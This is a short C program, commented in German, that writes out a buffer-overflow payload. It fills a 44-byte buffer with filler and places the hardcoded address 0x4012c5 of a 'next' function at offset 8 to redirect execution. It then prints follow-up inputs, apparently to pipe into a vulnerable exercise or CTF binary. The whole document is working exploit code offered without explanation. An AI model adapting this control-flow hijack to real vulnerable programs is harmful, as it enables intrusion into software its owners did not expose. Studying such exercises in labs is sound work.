#include <string.h>
#include <stdio.h>

int main() {

  char overflow[44];
  memset(overflow, '\0', 44);
  //filler für den buffer overflow

  int i;
  for(i = 0;i<44; i++ ){
    overflow[i]='0';
  }

  // adresse der next funktion als "payload" sollte immer 0x4012c5 sein
  overflow[8] = 0xc5;
  overflow[9] = 0x12;
  overflow[10] = 0x40;

  printf("%s", overflow);
  printf("\n");
  puts("exit");
  puts("zzzz");
  puts("i<3u");
}